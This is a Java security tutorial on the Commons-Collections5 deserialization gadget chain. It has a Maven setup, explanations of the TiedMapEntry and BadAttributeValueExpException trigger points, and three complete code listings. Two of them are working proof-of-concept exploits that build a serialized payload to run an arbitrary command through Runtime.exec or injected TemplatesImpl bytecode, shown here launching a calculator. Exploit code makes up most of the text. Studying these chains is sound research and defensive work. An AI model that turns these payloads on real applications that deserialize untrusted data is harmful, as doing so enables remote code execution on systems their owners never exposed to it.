# Java Security Learning-Commons-Collections5 Chain

#Environmental construction
> 1. `JDK` version: JDK1.8u66
> 2. `Commons-Collections` version: 3.1

> Use `maven` to build it. First create a `Maven` project without selecting any `Maven` template. The content in `pom.xml` is as follows. Then select the update on the right and let it automatically import the package.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>commons-collections</artifactId>
    <version>1.0-SNAPSHOT</version>

    <dependencies>
        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.1</version>
        </dependency>
    </dependencies>

</project>
```

# Pre-knowledge
## TiedMapEntry
> `org.apache.commons.collections.keyvalue.TiedMapEntry` is an implementation class of `Map.Entry`, which binds the `Entry` of the underlying `map`, and is used to make a `map entry` object have the function of modifying `map` at the underlying `map`

<img src="./images/11.png" alt="">

> There is a member property `Map` in `TiedMapEntry`. The `getValue()` method of `TiedMapEntry` will call the `get()` method of the underlying `map`, which can be used to trigger the `get` of `LazyMap`. Continue to follow up on the analysis and find that `TiedMapEntry`' equals/hashCode/toString` can trigger

<img src="./images/12.png" alt="">

> Test code

```java
package CommonsCollections5;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.comparators.TransformingComparator;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.io.IOException;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/**
 * @Author: H3rmesk1t
 * @Data: 2021/11/30 1:47 pm
 */
public class TiedMapEntryDemo {

    public static void TiedMapEntryDemo() throws NotFoundException, CannotCompileException, NoSuchFieldException, IllegalAccessException, IOException {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass ctClass = pool.makeClass("Evil");
        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        String shell = "java.lang.Runtime.getRuntime().exec(\"open -a /System/Applications/Calculator.app\");";
        ctClass.makeClassInitializer().insertBefore(shell);

        byte[] shellCode = ctClass.toBytecode();
        byte[][] targetCode = new byte[][]{shellCode};

        TemplatesImpl obj = new TemplatesImpl();
        Class clazz = obj.getClass();
        Field _name = clazz.getDeclaredField("_name");
        Field _bytecode = clazz.getDeclaredField("_bytecodes");
        Field _tfactory = clazz.getDeclaredField("_tfactory");
        _name.setAccessible(true);
        _bytecode.setAccessible(true);
        _tfactory.setAccessible(true);
        _name.set(obj, "h3rmesk1t");
        _bytecode.set(obj, targetCode);
        _tfactory.set(obj, new TransformerFactoryImpl());

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{obj})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map hashMap = new HashMap();
        Map map = LazyMap.decorate(hashMap, chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(map, 1);
        tiedMapEntry.toString();
    }

    public static void main(
String[] args) {
        try {
            TiedMapEntryDemo();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```
<img src="./images/14.png" alt="">

## BadAttributeValueExpException
> In the `javax.management.BadAttributeValueExpException` class, when `System.getSecurityManager() == null` or `valObj` is other basic types except `String`, the `valObj`' toString() method will be called, and this trigger point is used to cooperate with the previous `TiedMapEntry` to complete the chain construction.

<img src="./images/13.png" alt="">

# CommonsCollections5 Analysis
> Using the above two pre-knowledge trigger points, combined with `LazyMap`, you can complete a new attack path, that is, `CommonsCollections5` chain

## POC-1

```java
package CommonsCollections5;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/**
 * @Author: H3rmesk1t
 * @Data: 2021/11/30 1:59 pm
 */
public class CommonsCollections5Gadge1 {

    public static void CC5() throws ClassNotFoundException, NoSuchFieldException, IOException, IllegalAccessException {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a /System/Applications/Calculator.app"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        Map hashMap = new HashMap();
        Map map = LazyMap.decorate(hashMap, chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(map, "h3rmesk1t");

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException("h3rmesk1t");
        Class _class = Class.forName("javax.management.BadAttributeValueExpException");
        Field field = _class.getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException, tiedMapEntry);

        try {
            // Serialization
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(badAttributeValueExpException);
            objectOutputStream.close();

            // Deserialization
            ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));
            objectInputStream.readObject();
            objectInputStream.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        try {
            CC5();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```
<img src="./images/15.png" alt="">

## POC-2

```java
package CommonsCollections5;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commo
ns.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/**
 * @Author: H3rmesk1t
 * @Data: 2021/11/30 2:47 pm
 */
public class CommonsCollections5Gadge2 {

    public static void CC5() throws CannotCompileException, NotFoundException, NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass ctClass = pool.makeClass("Evil");
        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        String shell = "java.lang.Runtime.getRuntime().exec(\"open -a /System/Applications/Calculator.app\");";
        ctClass.makeClassInitializer().insertBefore(shell);

        byte[] shellCode = ctClass.toBytecode();
        byte[][] targetCode = new byte[][]{shellCode};

        TemplatesImpl templates = new TemplatesImpl();
        Class clazz = templates.getClass();
        Field _name = clazz.getDeclaredField("_name");
        Field _bytecode = clazz.getDeclaredField("_bytecodes");
        Field _tfactory = clazz.getDeclaredField("_tfactory");
        _name.setAccessible(true);
        _bytecode.setAccessible(true);
        _tfactory.setAccessible(true);
        _name.set(templates, "h3rmesk1t");
        _bytecode.set(templates, targetCode);
        _tfactory.set(templates, new TransformerFactoryImpl());

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        Map hashMap = new HashMap();
        Map map = LazyMap.decorate(hashMap, chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(map, "h3rmesk1t");

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException("h3rmesk1t");
        Class _class = Class.forName("javax.management.BadAttributeValueExpException");
        Field field = _class.getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException, tiedMapEntry);

        try {
            // Serialization
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(badAttributeValueExpException);
            objectOutputStream.close();

            // Deserialization
            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
            ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
            objectInputStream.readObject();
            objectInputStream.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        try {
            CC5();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```
<img src="./images/16.png" alt="">

# Call chain

```java
BadAttributeValueExpException.readObject()
   TiedMapEntry.toString()
        LazyMap.get()
            ChainedTransformer.transform()
                ConstantTransformer.transform()
                    InvokerTransformer.transform()
```

# Summarize
> Deserialize `BadAttributeValueExpException` calls `TiedMapEntry#toString`, indirectly calling `LazyMap#get`, triggering the subsequent `Transformer` malicious execution chain